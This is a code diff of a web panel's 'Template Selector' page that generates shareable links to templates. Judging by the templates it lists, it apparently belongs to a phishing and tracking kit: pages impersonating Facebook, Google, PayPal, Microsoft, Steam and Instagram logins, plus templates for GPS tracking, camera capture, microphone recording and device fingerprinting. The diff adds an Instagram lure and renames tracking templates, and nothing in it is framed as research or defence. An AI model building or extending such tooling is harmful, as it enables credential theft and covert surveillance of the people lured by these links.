@@ -278,7 +278,7 @@ else {
         <div class="header">
             <div>
                 <h1><i class="fas fa-link"></i> Template Selector</h1>
-                <div class="subtitle">Generate secure encrypted links for your templates</div>
+                <div class="subtitle">Generate links for your templates</div>
             </div>
             <a href="panel-v5.php" class="btn-back">
                 <i class="fas fa-arrow-left"></i> Back to Dashboard
@@ -311,6 +311,7 @@ else {
             'facebook': 'social',
             'twitter': 'social',
             'discord': 'social',
+            'instagram': 'social',
             'google': 'social',
             'microsoft': 'social',
             'netflix': 'media',
@@ -318,42 +319,59 @@ else {
             'steam': 'media',
             'paypal': 'payment',
             'advanced_location': 'tracking',
-            'location': 'tracking',
-            'camera': 'tracking',
+            'nearyou': 'tracking',
+            'camera_temp': 'tracking',
             'microphone': 'tracking',
-            'device_info': 'tracking',
+            'device_fingerprint': 'tracking',
             'weather': 'other',
-            'data_capture': 'other'
+            'normal_data': 'other'
         };
 
-        const templateGradients = {
-            'facebook': 'linear-gradient(135deg, #1877f2 0%, #166fe5 100%)',
-            'twitter': 'linear-gradient(135deg, #1d9bf0 0%, #0c8bd9 100%)',
-            'discord': 'linear-gradient(135deg, #5865f2 0%, #4752c4 100%)',
-            'google': 'linear-gradient(135deg, #ea4335 0%, #d23321 100%)',
-            'microsoft': 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)',
-            'netflix': 'linear-gradient(135deg, #e50914 0%, #b20710 100%)',
-            'spotify': 'linear-gradient(135deg, #1db954 0%, #1ed760 100%)',
-            'steam': 'linear-gradient(135deg, #171a21 0%, #1b2838 100%)',
-            'paypal': 'linear-gradient(135deg, #0070ba 0%, #005ea6 100%)',
-            'advanced_location': 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)',
-            'location': 'linear-gradient(135deg, #27ae60 0%, #229954 100%)',
-            'camera': 'linear-gradient(135deg, #3498db 0%, #2980b9 100%)',
-            'microphone': 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)',
-            'device_info': 'linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%)',
-            'weather': 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)',
-            'data_capture': 'linear-gradient(135deg, #34495e 0%, #2c3e50 100%)'
+        const templateInfo = {
+            'advanced_location': { name: 'Advanced Location', icon: 'fa-map-marker-alt', gradient: 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)', desc: 'GPS tracking with interactive map' },
+            'camera_temp': { name: 'Camera Access', icon: 'fa-camera', gradient: 'linear-gradient(135deg, #3498db 0%, #2980b9 100%)', desc: 'Capture photos and videos' },
+            'device_fingerprint': { name: 'Device Information', icon: 'fa-fingerprint', gradient: 'linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%)', desc: 'Complete device information' },
+            'discord': { name: 'Discord Verification', icon: 'fab fa-discord', gradient: 'linear-gradient(135deg, #5865f2 0%, #4752c4 100%)', desc: 'Discord account verification' },
+            'facebook': { name: 'Facebook Login', icon: 'fab fa-facebook', gradient: 'linear-gradient(135deg, #1877f2 0%, #166fe5 100%)', desc: 'Facebook authentication' },
+            'google': { name: 'Google Account', icon: 'fab fa-google', gradient: 'linear-gradient(135deg, #ea4335 0%, #d23321 100%)', desc: 'Google account recovery' },
+            'instagram': { name: 'Instagram', icon: 'fab fa-instagram', gradient: 'linear-gradient(135deg, #e1306c 0%, #c13584 100%)', desc: 'Instagram verification' },
+            'microphone': { name: 'Audio Recorder', icon: 'fa-microphone', gradient: 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)', desc: 'Record audio messages' },
+            'microsoft': { name: 'Microsoft Account', icon: 'fab fa-microsoft', gradient: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)', desc: 'Microsoft account sign-in' },
+            'nearyou': { name: 'Near You', icon: 'fa-location-arrow', gradient: 'linear-gradient(135deg, #27ae60 0%, #229954 100%)', desc: 'Find nearby locations' },
+            'netflix': { name: 'Netflix', icon: 'fa-film', gradient: 'linear-gradient(135deg, #e50914 0%, #b20710 100%)', desc: 'Netflix membership' },
+            'normal_data': { name: 'Data Collection', icon: 'fa-database', gradient: 'linear-gradient(135deg, #34495e 0%, #2c3e50 100%)', desc: 'General data capture' },
+            'paypal': { name: 'PayPal', icon: 'fab fa-paypal', gradient: 'linear-gradient(135deg, #0070ba 0%, #005ea6 100%)', desc: 'PayPal verification' },
+            'spotify': { name: 'Spotify', icon: 'fab fa-spotify', gradient: 'linear-gradient(135deg, #1db954 0%, #1ed760 100%)', desc: 'Spotify premium' },
+            'steam': { name: 'Steam', icon: 'fab fa-steam', gradient: 'linear-gradient(135deg, #171a21 0%, #1b2838 100%)', desc: 'Steam account access' },
+            'twitter': { name: 'X (Twitter)', icon: 'fab fa-twitter', gradient: 'linear-gradient(135deg, #1d9bf0 0%, #0c8bd9 100%)', desc: 'X platform sign-in' },
+            'weather': { name: 'Weather Check', icon: 'fa-cloud-sun', gradient: 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)', desc: 'Local weather information' }
         };
 
-        let allTemplates = [];
+        let allTemplates = {};
         let currentFilter = 'all';
 
         // Load templates
-        $.get('generate_links.php', function(response) {
-            if (response.success) {
-                allTemplates = response.templates;
-                renderTemplates(allTemplates);
-            }
+        $.get('list_templates.php', function(data) {
+            var templates = JSON.parse(data);
+            
+            templates.forEach(function(template) {
+                var info = templateInfo[template] || { 
+                    name: template, 
+                    icon: 'fa-link', 
+                    gradient: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+                    desc: 'Template'
+                };
+                
+                allTemplates[template] = {
+                    name: info.name,
+                    icon: info.icon,
+                    desc: info.desc,
+                    gradient: info.gradient,
+                    url: window.location.protocol + '//' + window.location.host + '/templates/' + template + '/index.html'
+                };
+            });
+            
+            renderTemplates(allTemplates);
         });
 
         function renderTemplates(templates) {
@@ -372,14 +390,13 @@ else {
 
             filtered.forEach(key => {
                 const template = templates[key];
-                const gradient = templateGradients[key] || 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
                 const category = templateCategories[key] || 'other';
 
                 const card = `
                     <div class="template-card" data-key="${key}" data-category="${category}">
                         <div class="copied-badge">✓ Copied!</div>
                         <div class="category-badge">${category}</div>
-                        <div class="template-icon" style="background: ${gradient}">
+                        <div class="template-icon" style="background: ${template.gradient}">
                             <i class="${template.icon}"></i>
                         </div>
                         <div class="template-body">
@@ -411,7 +428,7 @@ else {
                 Swal.fire({
                     icon: 'success',
                     title: 'Link Copied!',
-                    text: 'Encrypted link has been copied to clipboard',
+                    text: 'Link has been copied to clipboard',
                     timer: 2000,
                     showConfirmButton: false
                 });
